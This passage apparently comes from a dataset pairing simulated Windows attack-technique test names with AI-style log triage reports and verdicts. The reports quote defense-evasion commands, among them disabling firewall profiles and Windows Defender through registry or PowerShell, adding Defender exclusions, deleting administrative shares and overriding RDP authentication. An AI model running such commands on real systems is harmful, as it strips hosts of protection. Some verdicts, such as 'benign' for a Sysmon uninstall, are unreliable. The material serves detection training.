- Verify with the administrator or operational logs to confirm if the actions performed by `admin_test` were part of legitimate scheduled maintenance or update operations.
- Review system security policies to ensure only authorized users can perform log management and network share modifications.
- Consider auditing and monitoring the use of command-line tools and network share commands to detect unauthorized usage or malicious activities promptly."
Regsvr32 Registering Non DLL,"Based on the analysis of the provided Windows event logs, here are some observations and assessments:

1. **Suspicious File Operations:**
   - There are commands being executed that involve copying and renaming the `shell32.dll` to `shell32.jpg`, which is a known technique for masquerading malicious files with visually benign extensions. The command is being executed by `cmd.exe` and the user `SERVER002\\admin_test`. This could be an indicator of an attempt to hide a potentially malicious file.

2. **Suspicious Use of `regsvr32.exe`:**
   - The event logs show the execution of `regsvr32.exe` to register and execute the renamed `shell32.jpg`. The use of `regsvr32` to execute seemingly benign files (like `*.jpg`) can be indicative of a fileless malware or an attempt to execute code in a stealthy manner.

3. **Process Execution Flow:**
   - Multiple instances of command processors and console hosts are being spawned in a short span of time, initiating with `cmd.exe`. Following the suspicious operations stated above, `regsvr32.exe` is used. The chaining of these specific commands raises suspicion about potential unauthorized or malicious activity.

4. **Time Change Events:**
   - There are time change events captured under the security and system logs, executed by `svchost.exe`. While time changes can occur due to legitimate system or network adjustments, in the context of other suspicious activities, it could be worth verifying if this was intended or if it indicates tampering attempts.

5. **Process Ancestry:**
   - Many of the processes tie back to `wsmprovhost.exe`, which might suggest the involvement of Windows Remote Management (WinRM). This might be legitimate; however, combined with previous activities, it becomes part of a concerning pattern.

6. **No Clear Signs of Lateral Movement or Credential Access:**
   - There are no direct logs indicating lateral movement across the network or clear credential harvesting activities, aside from the general use of administrative-like commands.

### Conclusion:
**Resolution: SUSPICIOUS**

The actions described in the logs, particularly the use of masquerading tactics and the execution flow involving potentially malicious use of `regsvr32`, are concerning and suggest a risk of compromise. They warrant further investigation to confirm whether they are legitimate system administration tasks or indicative of a breach.

### Guidance and Next Steps:
- **Isolate the Host:** As a precautionary step, consider isolating the host from the network to prevent potential spread.
- **Conduct Forensic Analysis:** Perform a deeper forensic analysis, focusing on the file `shell32.jpg`, its contents, and any resultant registry changes from `regsvr32` operations.
- **User Verification:** Verify with the user `SERVER002\\admin_test` about the commands executed and whether they were intentional and authorized.
- **Review Access Logs:** Look through network and access logs for any other unusual connections or activities associated with the host.
- **Update Security Infrastructure:** Ensure security patches and antivirus signatures are up to date to detect known malicious activities and files.

Note: While the logs provide indicators of potential malicious activities, further leveraging of threat intelligence and contextual information, such as incident timelines and user role audits, is necessary to conclude with greater confidence."
LockBit Black - Unusual Windows firewall registry modification -Powershell,"Upon reviewing the provided Windows event logs, several observations can be made regarding potential anomalous or malicious activities:

### Suspicious Activities Observed

1. **PowerShell Usage to Modify Firewall Settings:**
   - The logs show a PowerShell command being executed: `powershell.exe & {New-ItemProperty \""HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\"" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force, New-ItemProperty \""HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\"" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force}`.
   - This command disables both the DomainProfile and StandardProfile firewalls by setting the EnableFirewall registry key values to 0.
   - This type of behavior is particularly concerning as it indicates an attempt to disable firewall protections, which is a common tactic used by attackers to enable further actions on a network without getting blocked.

2. **Unusual Use of Wevtutil and Conhost:**
   - Multiple instances of processes `wevtutil.exe` and `conhost.exe` running by the user `SERVER002\\admin_test` are observed. While these processes are not inherently malicious, their repetition could suggest potential misuse, such as log tampering or as a cover for malicious activities, especially when seen frequently and shortly one after another.

3. **Edge Update Activity:**
   - The logs highlight extensive activity involving various Microsoft Edge update processes (`MicrosoftEdgeUpdate.exe`), including updates and service registrations.
   - Although this may resemble routine application updates, the excessive spawning of such processes within a short period with varied command line arguments could indicate a need for closer scrutiny.

4. **Execution of `HOSTNAME.EXE` and `WHOAMI.EXE`:**
   - The execution of local system utilities like `hostname.exe` and `whoami.exe` might be employed in reconnaissance to gather system information or user details as part of a penetration methodology.

### Assessment and Resolution

Given the specifics of the events observed in the logs:

- The **PowerShell command** executed to disable firewalls is particularly suspicious and corresponds closely to activities that could be considered malicious if unauthorized or unexpected.
- The frequency and nature of process executions (`wevtutil.exe`, `conhost.exe`, and Edge updates) suggest atypical behavior worthy of further inspection to understand the intent and whether it aligns with legitimate administrative tasks.

**Resolution: SUSPICIOUS**

While there's a clear indication of a potential security breach due to the firewall modifications, further investigative steps are necessary to ascertain the intent behind these actions and correlate them with any authorized maintenance activities or anomalies in network behavior. These should involve:

1. Confirming whether the PowerShell command depicted has validity and authorization.
2. Cross-referencing network logs for any incoming or outgoing connections during and after the firewall changes.
3. Reviewing user `admin_test's` recent activities to ensure no potential compromise of credentials.
4. Checking for any related alerts or incidents raised during the same timeline.

**Guidance on Proceeding:**
1. **Immediate Review:** Validate with the responsible IT team about any expected configuration changes that could justify the observed activity.
2. **Mitigation:** If unauthorized, quickly re-enable firewall settings to their default states.
3. **Enhanced Monitoring:** Place the system in heightened monitoring to catch any recurring suspicious behavior.
4. **Threat Intelligence:** Compare the observed SHA256 hashes and other indicators against threat intelligence databases to identify any recognized malicious patterns."
Take ownership using takeown utility,"After a detailed analysis of the provided Windows event logs, I have identified the following points of interest:

1. **Time Change Events**: 
   - The Security and System logs (EventID 4616 and EventID 1,23) indicate changes in system time. Frequent or unauthorized time changes could be indicative of malicious activity, particularly when the time is changed to impact log timestamps or evade time-based security measures. However, there isn't additional direct evidence of malicious activity accompanying these time changes, and svchost.exe, a legitimate Windows process, is seen managing them.

2. **Command Line Usage**:
   - Several `cmd.exe` processes with suspicious command-line arguments are seen, such as `takeown.exe` for taking ownership of files (`takeown.exe /f %temp%\data.001_takeown_folder /r`). This action, while potentially legitimate, could be used maliciously to alter permissions on sensitive files. 

3. **Frequent Execution of Utilities**:
   - A series of executions involving system utilities like `wevtutil.exe`, `whoami.exe`, and `takeown.exe` from the Sysmon log. These processes are not inherently malicious but repeated use with elevated privileges, particularly in a short timeframe, might indicate suspicious behavior.

4. **High Integrity Processes**:
   - The process ""SERVER002\admin_test"" executing many of these commands at high integrity suggests either administrative tasks or privileged execution potentially indicating risky behavior if not authorized by legitimate administrative activity.

5. **EdgeUpdate Logs**:
   - Activities related to Microsoft Edge updates are observed primarily in the Sysmon and Application logs, especially around updates and registration, which seem consistent with normal browser update operations.

6. **Processes Run by NT AUTHORITY\SYSTEM**:
   - Multiple processes, such as WmiPrvSE.exe and EdgeUpdate activities, are run by SYSTEM, which is expected for system operations and software updates, providing they are authentic.

Overall Assessment:
- **BENIGN**: Many entries, such as the Microsoft Edge Update, are characteristic of regular system and software maintenance. 
- **SUSPICIOUS**: The high frequency of command line executions involving powerful system utilities with high privilege levels (e.g., `cmd.exe` with `takeown.exe`) suggests that it warrants further investigation. These could be administrative scripts, but without concrete verification, such actions need oversight.

Resolution: **SUSPICIOUS**

Steps to Proceed:
1. **Verify Authenticity**: Confirm that actions leading to file ownership changes were legitimate administrative tasks or scripts.
2. **Audit Administrator Accounts**: Ensure ""admin_test"" and other administrative accounts are not compromised.
3. **Review System Clock Changes**: Investigate the justification for system time adjustments to ensure no malicious intent.
4. **Watch for Anomalous Behavior**: Continue monitoring for further suspicious activities on this host, focusing on unexpected high privilege process executions."
Tamper with Windows Defender Registry - Reg.exe,"After a detailed analysis of the provided Windows event logs, the investigation reveals significant indicators of potentially malicious activity. Key observations include:

1. **Windows Defender Disabled**: Numerous entries in the application log indicate that Windows Defender was consistently turned off during the period of the logs. This is a significant red flag, as Windows Defender is a critical security measure in protecting against malware and other cyber threats.

2. **Suspicious Registry Modifications**: The Sysmon log contains events where `cmd.exe` was executed to modify the registry settings related to Windows Defender. Commands were run to disable various components of Windows Defender, including AntiSpyware, AntiVirus, Realtime Monitoring, and Script Scanning. This type of behavior is typically associated with malware attempting to disable security features to avoid detection.

3. **Time Manipulation**: The system and security logs show entries related to changes in system time, which could indicate attempts to manipulate timestamps and evade or confuse log analysis.

4. **Command-Line Argument Usage**: The execution of `cmd.exe` with detailed command lines to modify registry settings further supports the malicious intent to systematically disable security features.

5. **Process Execution**: Execution of processes such as `wevtutil.exe` used to control event logs, and `whoami.exe` used for checking user identity, can be suspicious in contexts where system changes are being made to disable security.

Given these findings, the resolution is:

- **MALICIOUS**: The logs clearly contain activity indicative of a compromise. The systematic disabling of Windows Defender security features is a strong indicator of malicious activity, likely to facilitate or mask further attacks on the system.

### Guidance on How to Proceed:

1. **Immediate Containment**: Isolate the affected system, Server002, from the network to prevent further spread or data exfiltration.

2. **Detailed Forensic Analysis**: Conduct a deeper forensic analysis on Server002 to identify the entry point of the attack and any additional malicious payloads that may be present.

3. **Incident Response**: Engage the incident response team to manage the situation, preserve evidence, and begin eradication and recovery processes.

4. **Restore Security Controls**: Re-enable and update Windows Defender and other security controls to their recommended settings.

5. **Network Monitoring**: Monitor network traffic for any other systems showing similar symptoms or evidence of attack patterns for potential threats.

6. **User Awareness**: Review user activities and train them on identifying and avoiding potential security threats to prevent future incidents. 

Taking these steps will help mitigate the immediate risks and prevent reoccurrence of a similar attack."
DLP Evasion via Sensitive Data in VBA Macro over HTTP,"Upon reviewing the logs provided across Security, System, PowerShell, and Sysmon, the following observations and analysis are made:

### **Security Log Observations:**

1. **EventID 4616:** 
   - These entries involve time adjustment events by the `svchost.exe` under the context of `LOCAL SERVICE`. Time changes on a system can be indicative of malicious activity, like log tampering, but without additional context suggesting compromise, these may be routine corrections.

2. **EventID 5379:** 
   - These entries correspond to attempts to access specific credential stores (likely related to Microsoft accounts and services) that failed (ReturnCode: 3221226021 corresponds to `STATUS_OBJECT_NAME_NOT_FOUND`). While failed attempts could suggest probing or misconfiguration, they often require context, such as frequency and source, to further investigate their relevance.

3. **EventID 4672 and 4624:**
   - A privileged logon session for the user `admin_test` is seen, accompanied by a `LogonType` of 3, which denotes network logon. Privileges granted include some that provide high authority on the system (`SeDebugPrivilege`, etc.). Network logons with elevated privileges should be investigated, especially if unexpected.

### **System Log Observations:**

- **Various Kernel and Time Service Events (EventIDs 1, 24, 35):**
  - These indicate time adjustments and updates from Microsoft's time server, which, absent anomalies, are typical and expected in normal operations.

- **Windows Update Events (EventIDs 44, 43, 19):**
  - These detail updates to Microsoft Defender, suggesting regular updating activity—an expected and benign behavior.

### **Windows PowerShell Log Observations:**

- **EventID 600 (PowerShell Execution):**
  - These entries indicate PowerShell was used to execute a `Invoke-WebRequest` with a local URI and data from what appears to be a macro-enabled Excel file (`data-cc-macro.xlsm`). Executing scripts from macro files can be indicative of phishing attack vectors or malware deployment and merits further investigation.

### **Sysmon Log Observations:**

- **Process Creation Events (EventID 1):**
  - Noteworthy are the multiple executions of `whoami.exe` and `conhost.exe` by the `admin_test` user. Excessive or repetitive querying of system/user information may warrant further exploration as it might indicate reconnaissance.
  - `wevtutil.exe` executions follow `whoami` executions, potentially pointing to log manipulation attempts. 
  - PowerShell (`powershell.exe`) is launched with a script that mirrors the PowerShell logs, reinforcing the need to investigate the source Excel file further.

### **Assessment & Recommended Actions:**

Based on the observations, there are several indicators of potentially suspicious activity:

- The use of PowerShell to interact with a macro file could indicate malicious macros executing unauthorized actions.
- The network logon with elevated privileges for `admin_test` alongside immediate execution of system querying commands and potential log management utilities (`wevtutil.exe`) suggest deliberate actions requiring further validation.

**Resolution: SUSPICIOUS**

- **Further Investigation:**
  - Cross-reference the `admin_test` activities with known maintenance schedules, user intent, or deviations from expected patterns.
  - Assess the provenance and legitimacy of the macro-enabled Excel file—determine if it is known and deliberately executed by trusted entities.
  - Review network activity, especially related to the `admin_test` logon session, for any external or lateral movements.
  - Examine the workstation and user behaviors around the times of PowerShell execution for anomalies or potential data exfiltration.

Overall, while there isn't definitive proof of malicious intent, the indicators necessitate further investigation to ensure no initial compromise has occurred."
Disable Administrative Share Creation at Startup,"In analyzing the provided Windows event logs, here are my observations and findings:

### Observations:

1. **Time Change Events**:
   - Multiple time change events involving `svchost.exe` are logged. It appears that the system time was adjusted several times back and forth within milliseconds. This could be a normal sync with a time server (e.g. `time.windows.com`) as observed in the Microsoft-Windows-Time-Service EventID 35, which does indicate a connection to an NTP server.

2. **Security Events**:
   - **EventID 4672**: Logs indicate that the account `admin_test` was granted special privileges including SeDebugPrivilege, SeBackupPrivilege, and others. This event suggests an account with administrative privileges was active on the system.
   - **EventID 4624**: Shows logon events where the account `admin_test` was authenticated via NTLM protocol from the workstation `DESKTOP-3HL5B2P`. The use of NTLM is common but might raise a concern in a highly secured environment, especially if Kerberos is the expected authentication method.

3. **Process Execution**:
   - **Sysmon Logs** show multiple executions of `wevtutil.exe`, `conhost.exe`, `cmd.exe`, `whoami.exe`, and `reg.exe` by the user `admin_test`. 
   - The command executed via `cmd.exe` involved changes to the registry keys related to AutoShareServer and AutoShareWks. Specifically, this configuration disables administrative share points on the server, which can be a security best practice but should be validated with policy. 

4. **Microsoft Edge Update Activity**:
   - The logs contain numerous activities related to Microsoft Edge updates, which involve legitimate processes like `MicrosoftEdgeUpdate.exe` and related helper executables. All these processes show legitimate parent-child relationships and are consistent with regular update behavior for the Microsoft Edge browser.

### Assessment:

- The observed behavior of frequent time changes is most likely related to the system synchronizing time with an NTP server and appears benign.
- The execution of commands to modify registry settings suggests a change in system/server configuration performed using administrative privileges. This could be benign if done intentionally as a policy or patch update. However, without confirmation of intended change, it warrants further investigation.
- The network login from `DESKTOP-3HL5B2P` using NTLM and the account `admin_test` should be verified if this was an expected action. The use of NTLM in a sensitive environment could suggest a need for tighter network security controls.
- The Edge Update activities are normal and expected as part of regular software updates from Microsoft.

### Guidance and Recommendation:

- Verify with system administrators if the registry modifications were planned or expected. If not, investigate further to ensure they were not unauthorized actions.
- Review the security policies regarding NTLM authentication and consider enforcing Kerberos where applicable for better security.
- Confirm with the relevant teams about the known activities or tasks executed using the `admin_test` account and from the `DESKTOP-3HL5B2P` workstation.
- Set up alerting for any administrative privilege grants or immediate registry alterations to ensure oversight.

### Resolution:

Based on the provided logs and events, the **resolution** is **SUSPICIOUS**. There is no conclusive evidence of malicious activity, but specific actions, particularly the registry changes, require further investigation to ensure they're legitimate and authorized."
Windows - Timestomp a File,"Upon an in-depth analysis of the provided logs, here is the detailed assessment of the situation:

### Suspicious or Anomalous Behavior:

1. **Use of Timestomping**: 
   - The PowerShell logs contain entries indicating the execution of a PowerShell script named `timestomp.ps1` located in a temporary directory. The timestomp script is typically used to alter file timestamps and is indicative of potential malicious behavior aiming to hinder forensic analysis by modifying timestamps and evading detection.

2. **PowerShell Execution with Imported External Script**:
   - The command `import-module ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\timestomp.ps1""` suggests the execution of an external PowerShell script, which is considered suspicious, particularly in a temporary directory used with potentially malicious tools like `timestomp`.

3. **Sysmon Logs Indicating PowerShell Activity**:
   - Sysmon logs confirm the execution of `powershell.exe` with the suspicious script. Such activities are often correlated with lateral movement or stage payload deployment in compromised machines.

4. **Excessive System Process Executions**:
   - There are multiple instances of executions of common Windows utilities, like `conhost.exe` and `wevtutil.exe`. While these are legitimate processes, the pattern of rapid consecutive executions in conjunction with admin-like commands suggests a potential attempt to clear event logs using `wevtutil.exe`.

### Indicators of Malicious Activity or Compromise:

- **Execution of Security Evasion Tools**: The presence and execution of the `timestomp.ps1` script.
- **Unusual Use of PowerShell**: Execution of PowerShell with external unknown scripts is a common indicator of potential compromise.
- **Event Log Manipulation**: Use of `wevtutil.exe` suggests possible tampering or clearing of event logs.
  
### Resolution:
Given these indicators, the activity observed in the logs is marked as:

- **MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Isolation**: Isolate `Server002` from the network to prevent further potential spread of malicious activity.
2. **Deep Forensic Analysis**: Conduct a comprehensive forensic analysis to determine the full extent of the compromise.
3. **Check for Persistence Mechanisms**: Identify and remove any persistence mechanisms established by the malicious scripts.
4. **Audit User Accounts**: Review `SERVER002\admin_test` and any other elevated privileges for unauthorized access or modifications.
5. **Incident Response**: Initiate a coordinated incident response procedure to identify, contain, and eradicate malicious artifacts.
6. **Review Logs**: Secure the logs for further analysis and possible legal investigation.
7. **System Restoration**: Consider a full restoration from a clean backup where necessary, and strengthen monitoring and endpoint security postures.

This evaluation confirms suspicious actions indicative of malicious intent, primarily evidenced by the use of timestomping and potential event log manipulations, which are hallmarks of threat actor activities to evade detection."
Invoke CHM Shortcut Command with ITS and Help Topic,"After conducting a detailed review of the provided log entries, here are the key findings:

### Suspicious or Anomalous Behavior:
1. **PowerShell Activity**:
   - Multiple instances of `powershell.exe` have been executed (EventID 5, Sysmon), one of which has an unusual command:
     - `""powershell.exe"" & {Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler its -TopicExtension html -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm}`.
   - This command appears to attempt to execute a potential malicious script named `Invoke-ATHCompiledHelp`, which is not commonly seen in legitimate operations and seems crafted to perform potentially harmful activities. This should be investigated further as it indicates possible malicious script execution.

2. **Process Executions**:
   - Frequent spawning of `wevtutil.exe` and `conhost.exe` by the same user account, `SERVER002\\admin_test`. While `conhost.exe` is often legitimate, the excessive number of these processes in quick succession can sometimes indicate the use of obfuscation or attempts to hide malicious activity.

3. **Security Events (Security Log)**:
   - Various `5379` events indicating failed attempts to retrieve credentials or verify tokens related to `MicrosoftAccount:user=02txoixylodcstop`. These repeated failures might suggest attempts to access accounts or services without proper authorization.

4. **High Integrity Level**:
   - Processes executed with a 'High' integrity level, especially regarding PowerShell, raise a red flag since this could mean elevated privileges were used to run potentially harmful scripts.

### Potential Indicators of Compromise:
- **PowerShell Commands**: Particularly the use of custom/obfuscated scripts.
- **Unusual Persistence of Processes**: Especially frequent `conhost.exe` executions without clear cause.
- **Failed Credential Access Events**: Could indicate attempts of unauthorized access, although such events might also occur due to configuration issues.

### Assessment:
Based on the evidence presented, the behavior recorded in the logs is concerning, particularly the use of PowerShell with potentially malicious commands and failed login attempts. The combination of frequent process creation, high integrity levels, and suspicious command execution suggests potential malicious activity.

### Resolution: SUSPICIOUS
The findings indicate suspicious activity that needs further investigation. While there’s no conclusive evidence of malware or compromise, the signs suggest the possibility. It is recommended to:

1. Review and investigate the PowerShell scripts executed on `Server002` and verify their origins and purpose.
2. Monitor and audit accounts for unusual behavior, especially `SERVER002\\admin_test`.
3. Check for any additional firewall, antivirus, or HIDS/HIPS alerts corresponding to the timeframe these logs were recorded.
4. Engage with the user(s) or account managers involved to clarify any legitimate explanations for these activities.

Proceeding with caution, continuous monitoring, and deeper investigation into network and external devices/systems for any lateral movement is advisable."
Uninstall Sysmon,"Upon reviewing the provided set of logs, I focused on the elements available from the Application and System logs, as the Security and Windows PowerShell logs contain no entries. Here are the observations from each log type:

**Application Log Review:**
- There are entries related to the `edgeupdate` service stopping twice. The entries are as follows:
  - `""2024-10-28 08:08:58.8042909""` and `""2024-10-28 08:09:01.1428784""`
  - The Edge Update service is a normal background service that handles updating Microsoft Edge. Service stops can occur due to service restarts during regular operations or updates. Unless there are accompanying signs of manipulation or tampering, this can be considered benign.
  
- The entry related to the `Microsoft-Windows-Security-SPP` indicates the regular operation of the Software Protection Platform Service, which handles licensing and activation. No suspicious activities noted with this entry.

**System Log Review:**
- The log entry for the `Microsoft-Windows-FilterManager` indicates an activity related to ""SysmonDrv,"" which is likely linked to the System Monitor Driver. The `FinalStatus` code `0x0` implies successful operation. There are no indications of issues or malicious alterations from this entry alone.

**Final Assessment:**

- **Significance of the Entries:** 
  - Each entry in the logs appears to describe normal operations of respective services without additional context that would suggest malicious activity.
  - There is no direct evidence of unusual process execution, privilege escalation, or suspicious command-line arguments indicating a compromise.

- **Assessed Threat Level:**
  - **Edge Update Service Stopping:** While service stoppage might draw attention, it is normal for system updates or configurations. Repeated, unexplained stoppage might need further context or checking for related updates, but not necessarily indicative of compromise without further evidence.
  - **Software Protection Platform Service:** This seems like regular system operation.
  - **SysmonDrv Activity:** Appears to be routine, as successful driver operations do not raise an alarm. 

- **Final Conclusion:** 
  Based on the provided logs and their entries, I have found no indication of malicious activities.
  - **Resolution: BENIGN**

**Guidance for Proceeding:**
1. Continue monitoring systems for any unusual behavior or alerts. If consistent Edge service issues re-emerge, evaluate any associated configurations or updates.
2. Ensure all system drivers and services remain updated and are regularly audited for integrity.
3. Encourage user reporting for any anomalies in system behavior to help with early detection of potential threats. 

Overall, these logs present no signs of compromise or immediate threat based on the data provided."
Tamper with Windows Defender ATP PowerShell,"Upon analyzing the provided Windows event logs, we can discern a few critical pieces of information and potential indicators of malicious activity:

### Analysis:

1. **PowerShell Events**:
   - Multiple PowerShell events indicate that specific security settings were modified using the `Set-MpPreference` cmdlet. These settings include:
     - Disabling real-time monitoring.
     - Disabling behavior monitoring.
     - Disabling script scanning.
     - Disabling block at first seen.
   - The presence of these commands is suspicious because disabling these security features can significantly weaken the system's defenses, making it more vulnerable to malicious activities.

2. **Application Logs**:
   - The application logs repeatedly log events with ""Windows Defender, SECURITY_PRODUCT_STATE_SNOOZED"". This state suggests that Windows Defender is temporarily disabled or in a snooze state, which correlates with the PowerShell commands observed. This is another indicator that security features have been deliberately disabled.

3. **Sysmon Logs**:
   - There is evidence of multiple executions of `wevtutil.exe` and `conhost.exe` by `SERVER002\admin_test`. The `wevtutil.exe` can be used for legitimate purposes such as managing event logs but can also be misused in an attack to manipulate or clear logs.
   - Execution of `HOSTNAME.EXE` and `whoami.exe` from `C:\Windows\System32\` seems to be collecting system information which might be benign depending on the context but combined with other suspicious activities could indicate reconnaissance actions.

4. **Security and System Logs**:
   - Time changes were logged, indicating potential tampering or synchronization discrepancies. `svchost.exe` made changes to the system time, which can be indicative of an attempt to obscure actions.
   - Network service interactions appear normal, but the presence of `svchost.exe` in timing operations and Windows Management Instrumentation (WMI) through `WmiPrvSE.exe` could suggest living off the land techniques.

### Assessment:

Based on the content of the logs, there are clear indicators of suspicious activity, chiefly the disabling of critical security features and potential tampering with Windows Event Logs. The activities related to PowerShell commands, snoozing of Windows Defender, and execution of various processes appear orchestrated to weaken the system and potentially cover tracks.

### Resolution: SUSPICIOUS

The activity observed in the logs is suspicious and warrants further investigation. The log entries indicate deliberate actions to disable security features which is frequently aligned with malintent, but there is not enough evidence at this point to ascertain a definitive malicious intent without additional context or corroborating evidence.

### Guidance:

1. **Immediate Steps**:
   - Conduct a thorough forensic examination of the system (`Server002`) to assess if there is any post-exploitation evidence or persistence mechanism.
   - Verify the integrity and version of the executables involved to check for any anomalies or unauthorized modifications.

2. **Monitoring and Mitigation**:
   - Reinstate all disabled security settings immediately and ensure continuous monitoring of future attempts to modify security configurations.
   - Review user and system permissions, especially the account `admin_test` to restrict unauthorized usage.
   - Increase logging levels for both PowerShell and Sysmon to gather more detailed insights for future investigations.

3. **Incident Reporting**:
   - Document all findings and any actions taken thoroughly and report them to the appropriate incident response teams for further assessment and response planning.
   - Collaborate with intrusion detection systems (IDS) and cybersecurity analysts to ensure detection rules are updated to capture similar activities in the future."
Remove Administrative Shares,"Upon reviewing the provided Windows event logs, focusing on the System, Sysmon, Application, and Security logs, here is a detailed analysis of the findings:

1. **Time Synchronization Events:**
   - There are multiple entries in the System log showing time synchronization events, where the system time was updated. These are logged by the Kernel-General (EventID 1) and Time-Service (EventID 35). They indicate normal behavior related to time adjustments from an NTP server (`time.windows.com`).

2. **SVCHOST.EXE Activities:**
   - Activities involving `svchost.exe` in the System and Security logs typically represent various background Windows services being executed. These are expected and generally benign unless accompanied by anomalous behaviors or unauthorized access patterns.

3. **Process Creation and Techniques Used:**
   - Analysis of the Sysmon events shows regular executions of Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) and some legitimate Windows utilities (`whoami.exe`, `hostname.exe`, `cmd.exe`, `net.exe`, and `wevtutil.exe`).
   - The command `""cmd.exe"" /c for %%i in (C$ IPC$ ADMIN$) do net share %%i /delete` indicates an attempt to remove administrative shares, which could be deemed suspicious. However, assessing context such entries can also occur during legitimate administrative maintenance activities.

4. **PowerShell and Application Logs:**
   - The PowerShell log is empty and thus not contributing any insights into potential activities.
   - The Application log records a routine entry by the Software Protection Platform Service. This falls under normal system operation.

5. **Security Log Events:**
   - The only Security log entries (EventID 4616) indicate time change events, consistent with the system time synchronization mentioned earlier, without indications of privilege escalation or unauthorized system changes.

**Suspicious Activities:**
- The most conspicuous behavior involves a script or command executed via `cmd.exe`, attempting to delete default shared network resources such as `C$`, `IPC$`, `ADMIN$`. While this can sometimes be legitimate (e.g., hardening efforts), it is also a common action taken in lateral movement or cleanup activities by malicious actors to hide their tracks.

**Assessment:**
- **Resolution: SUSPICIOUS**

The presence of the command aimed at deleting administrative shares makes the activity suspicious. Although such actions could occur in administrative scenarios, further context about why this was executed, who initiated it, and if it aligns with authorized maintenance activities, needs to be verified. If this was not planned or logged by IT staff, it should be further investigated.

**Recommendations:**
- Verify with system administrators to ascertain if the activity around deleting administrative shares was planned or sanctioned.
- Review access logs or endpoint security solutions for further anomalies around the same timeframe, focusing on potential lateral movement or unauthorized access attempts.
- Consider strengthening audit log review practices and ensuring alerts are configured for high-sensitivity actions such as the alteration or removal of system resources or built-in shares.
- If unauthorized behavior is confirmed, recommend isolating affected systems and performing a more detailed forensic investigation to assess potential compromises."
RDP Authentication Level Override,"Upon reviewing the provided Windows event logs, several key observations can be made regarding potential signs of malicious activity:

1. **Suspicious Registry Modification**:
   - EventID 1 shows a `cmd.exe` process executed with a command to modify the registry key `""HKCU\\Software\\Microsoft\\Terminal Server Client"" /v AuthenticationLevelOverride /t REG_DWORD /d 0 /f`. This registry modification can be used to manipulate Remote Desktop Protocol (RDP) client behavior, which might allow unauthorized access or compromise of RDP connections, especially if done without prior authorization or business justification.

2. **Frequent Execution of Administrative Commands**:
   - Multiple executions of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\\admin_test` are noted. While `wevtutil.exe` is a legitimate Windows utility for managing event logs, its frequent execution in a short time span without clear context or rationale could indicate log tampering or another form of evasion.

3. **Use of High-Integrity Processes**:
   - High integrity level processes like `cmd.exe` and registry edits initiated by administrative accounts suggest a likelihood of privilege escalation or attempts to perform sensitive operations on the system, which requires elevated access rights.

4. **Analysis of Security Events**:
   - EventID 4672 reveals that the user `admin_test` was granted multiple high-level privileges, including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others. Such privileges can be exploited to gain full control over the system and perform unauthorized actions, very indicative of a potential security risk especially if these are not standard practices.

5. **Network Time Changes**:
   - There are several time changes (Security logs EventID 4616) recorded. While sometimes necessary, frequent or unexplained modifications to system time might be an attempt to disguise or obfuscate malicious activities by altering event timestamps.

**Conclusion and Resolution**:

Based on the combination of registry modifications, the execution of system utilities potentially for evasion, and assignment of high-level privileges, the activities observed are classified as:
- **Resolution: SUSPICIOUS**

**Guidance on How to Proceed**:
- Perform a deeper analysis of registry changes, especially focusing on whether the modification made to `AuthenticationLevelOverride` was authorized and necessary.
- Investigate the account `admin_test` to verify any legitimate need for the high-level privileges it was granted.
- Review security policies and audit logs to validate if similar patterns of behavior have been recorded previously and if they comply with security operation baselines.
- Check for any network breaches or attempts of unauthorized access that coincide with the timestamp of these logs.
- If applicable, engage the user or related personnel to verify the legitimacy of these actions.
"
Tamper with Windows Defender Evade Scanning -Extension,"Upon analyzing the provided Windows event logs, several sections of the logs have been checked for suspicious activity, including the System, Application, Windows PowerShell, Sysmon, and Security logs.

Here is a detailed analysis of the logs:

### System log ###
1. **Time Change Event**: 
   - The time was adjusted from ""2024-10-28 08:53:39.5410749"" to ""2024-10-28 08:53:33.5459928"" indicating a system time backward shift, which is unusual and can sometimes indicate an attempt to manipulate file timestamps to mask malicious activity.
   - This was executed by `svchost.exe`, which is a legitimate Windows service host process. However, its frequent appearance in conjunction with time changes should be tracked.

2. **Time Source Update**:
   - Time source update to `time.windows.com` is normal and expected for synchronization.

### Application Log ###
- **Edge Update Events**:
  - The logs show the stopping of a service named `edgeupdate` which appears to be legitimate activity related to updating the Edge browser. The presence of multiple entries related to update processes is routine and expected.

### Windows PowerShell log ###
- **PowerShell Execution**:
  - A PowerShell script executed a command to exclude `.exe` files from Windows Defender with `Add-MpPreference -ExclusionExtension $excludedExts`. This command could be a potential indicator of malicious behavior as it reduces the efficacy of antivirus scans, although it may also be executed by administrators for valid reasons. This activity is suspicious and needs further investigation.

### Sysmon log ###
- **Execution of System Utilities**:
  - Execution of various system utilities such as `wevtutil.exe`, `conhost.exe`, and `hostname.exe` by `admin_test` is noted. While these are typically valid processes, their use should be verified for legitimacy, especially wevtutil as it’s used for event log management and could indicate log tampering.
  
- **Edge Update Installer**:
  - Repeated execution of `MicrosoftEdgeUpdate.exe` in various directories suggests a standard update process, but the frequency and presence of commands like `/regsvc`, `/svc`, and temp directory operations can be further analyzed to ensure no abuse of these functionalities.

### Security Log ###
- **No entries present**: This is unusual for a Windows security log and could indicate a potential issue such as log clearing or message queuing issues, which is sometimes a tactic used to cover tracks in case of compromise.

### Conclusion ###
The analysis points to the following:

- **Time Adjustment**: Requires review to ensure it wasn’t done for malicious purposes.
- **PowerShell Commands**: Exclusion of `.exe` files from defender posing a potential risk that necessitates further investigation.
- **Regular Process Activities**: Many logged system and updater activities appear routine but the high frequency, especially in an enterprise environment, requires validation as legitimate.

### Final Assessment: SUSPICIOUS
Given the suspicious adjustment of system time, PowerShell activities disabling antivirus capabilities, and the absence of Security log entries, I recommend further investigation to determine whether these could be components of a larger compromise.

### Guidance on how to proceed:
1. **Investigate Time Changes**: Verify user actions leading to the time changes to ensure they align with expected administrative tasks.
2. **Review PowerShell Scripts**: Check if the registry exclusions are necessary and who authorized them. Verify that power shell logs have not been tampered with.
3. **Security Logs**: Investigate why there are no security log events and verify that log forwarding and security settings on the device are configured correctly.
